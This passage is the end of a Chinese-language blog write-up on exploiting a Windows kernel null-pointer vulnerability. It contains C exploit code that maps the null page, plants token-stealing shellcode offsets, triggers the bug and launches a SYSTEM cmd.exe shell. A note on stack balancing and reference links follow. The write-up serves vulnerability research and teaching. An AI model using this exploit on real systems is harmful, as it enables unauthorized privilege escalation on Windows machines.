class="line"></div><div class="line">    FillRgn((HDC)hdc, (HRGN)hRgn, (HBRUSH)hBrush);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</div><div class="line">&#123;</div><div class="line">    PVOID base = (PVOID)<span class="number">0x1</span>;</div><div class="line">    SIZE_T size = <span class="number">0x1000</span>;</div><div class="line"></div><div class="line">    FARPROC addr = GetProcAddress(GetModuleHandle(<span class="string">"ntdll.dll"</span>),<span class="string">"NtAllocateVirtualMemory"</span>);</div><div class="line">    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)addr;</div><div class="line"></div><div class="line">    NTSTATUS status = NtAllocateVirtualMemory(</div><div class="line">        GetCurrentProcess(),</div><div class="line">        &amp;base,</div><div class="line">        <span class="number">0</span>,</div><div class="line">        &amp;size,</div><div class="line">        MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN,</div><div class="line">        PAGE_EXECUTE_READWRITE</div><div class="line">        );</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (status != <span class="number">0</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[*]can not allocate null page"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">memset</span>(<span class="number">0x0</span>, <span class="number">0</span>, <span class="number">0x1000</span>);</div><div class="line"></div><div class="line">    <span class="keyword">void</span>* bypass_one = (<span class="keyword">void</span> *)<span class="number">0x590</span>;</div><div class="line">    *(LPBYTE)bypass_one = <span class="number">0x1</span>;</div><div class="line">    <span class="keyword">void</span>* bypass_two = (<span class="keyword">void</span> *)<span class="number">0x592</span>;</div><div class="line">    *(LPBYTE)bypass_two = <span class="number">0x1</span>;</div><div class="line">    <span class="keyword">void</span>* jump_addr = (<span class="keyword">void</span> *)<span class="number">0x748</span>;</div><div class="line">    *(LPDWORD)jump_addr = (DWORD)TokenStealingShellcodeWin7;</div><div class="line"></div><div class="line">    Trigger_BSoDPoc();</div><div class="line">    system(<span class="string">"cmd.exe"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>一定要注意，<code>token-steal shellcode</code>这个函数一定要有四个参数，以为<code>call edi</code>的时候传入了四个参数，如果不写参数会导致堆栈不平衡造成<code>BSoD</code>（如果在shellcode中平衡堆栈也可以）。</p>
<p>执行结果</p>
<p><img src="3.png" alt=""></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://blog.nsfocus.net/null-pointer-vulnerability-defense/" target="_blank" rel="external">http://blog.nsfocus.net/null-pointer-vulnerability-defense/</a><br><a href="https://www.whitehatters.academy/intro-to-windows-kernel-exploitation-3-my-first-driver-exploit/" target="_blank" rel="external">https://www.whitehatters.academy/intro-to-windows-kernel-exploitation-3-my-first-driver-exploit/</a><br><a href="http://blog.csdn.net/one_in_one/article/details/51766912" target="_blank" rel="external">http://blog.csdn.net/one_in_one/article/details/51766912</a><br><a href="https://whereisk0shl.top/ssctf_pwn450_windows_kernel_exploitation_writeup.html" target="_blank" rel="external">https://whereisk0shl.top/ssctf_pwn450_windows_kernel_exploitation_writeup.html</a><br><a href="https://github.com/k0keoyo/SSCTF-pwn450-ms16-034-writeup" target="_blank" rel="external">https://github.com/k0keoyo/SSCTF-pwn450-ms16-034-writeup</a></p>
</div><div class="tags"><a href="/tags/安全/">安全</a><a href="/tags/漏洞分析/">漏洞分析</a></div><div class="post-nav"><a href="/2017/08/29/如何在python中定义有序字典/" class="pre">如何在python中定义有序字典</a><a href="/2017/07/13/CVE-2017-9073-EsteemAudit分析-翻译自趋势科技/" class="next">CVE-2017-9073 EsteemAudit分析[翻译自趋势科技]</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" target="_blank" class="search-form"><input type="search" name="word" maxlength="20" placeholder="Search"/><input type="hidden" name="si" value="http://weaponx.site"/><input name="tn" type="hidden" value="bds"/><input name="cl" type="hidden" value="3"/><input name="ct" type="hidden" value="2097152"/><input name="s" type="hidden" value="on"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/安全/">安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tech/">技术</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/life/">生活</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/整形溢出/" style="font-size: 15px;">整形溢出</a> <a href="/tags/博客/" style="font-size: 15px;">博客</a> <a href="/tags/安全/" style="font-size: 15px;">安全</a> <a href="/tags/影评/" style="font-size: 15px;">影评</a> <a href="/tags/Django/" style="font-size: 15px;">Django</a> <a href="/tags/pwn/" style="font-size: 15px;">pwn</a> <a href="/tags/UAF/" style="font-size: 15px;">UAF</a> <a href="/tags/python/" style="font-size: 15px;">python</a> <a href="/tags/Hexo/" style="font-size: 15px;">Hexo</a> <a href="/tags/ASLR/" style="font-size: 15px;">ASLR</a> <a href="/tags/Linux/" style="font-size: 15px;">Linux</a> <a href="/tags/wargame/" style="font-size: 15px;">wargame</a> <a href="/tags/漏洞分析/" style="font-size: 15px;">漏洞分析</a> <a href="/tags/调试/" style="font-size: 15px;">调试</a> <a href="/tags/逆向/" style="font-size: 15px;">逆向</a> <a href="/tags/漏洞/" style="font-size: 15px;">漏洞</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/09/14/从Xshell后门看DLL加载流程/">从Xshell后门看DLL加载流程</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/如何在python中定义有序字典/">如何在python中定义有序字典</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/11/CVE-2016-0095从PoC到Exploit/">CVE-2016-0095从PoC到Exploit</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/13/CVE-2017-9073-EsteemAudit分析-翻译自趋势科技/">CVE-2017-9073 EsteemAudit分析[翻译自趋势科技]</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/07/NETBIOS主机名编码算法/">NETBIOS主机名编码算法</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/23/CVE-2010-2553分析-漏洞战争/">CVE-2010-2553分析[漏洞战争]</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/19/ISCC中pwn200-shell无法启动原因详解/">ISCC中pwn200 shell无法启动原因详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/19/Ubuntu上源码调试glibc/">Ubuntu上源码调试glibc</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/16/勒索软件WannaCry的FAQ/">勒索软件WannaCry的FAQ</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/08/CVE-2010-3333分析-漏洞战争/">CVE-2010-3333分析[漏洞战争]</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.cnblogs.com/goabout2/" title="goabout2" target="_blank">goabout2</a><ul></ul><a href="http://rootkiter.com/" title="RootKiter" target="_blank">RootKiter</a><ul></ul><a href="http://reverse-tcp.xyz/" title="Urahara" target="_blank">Urahara</a><ul></ul><a href="https://www.leavesongs.com/" title="phith0n牛的离别歌" target="_blank">phith0n牛的离别歌</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2017 <a href="/." rel="nofollow">WeaponX's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.css"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?ab50f379bb6434641ee0125ce5d37f23";
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
  })();
</script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>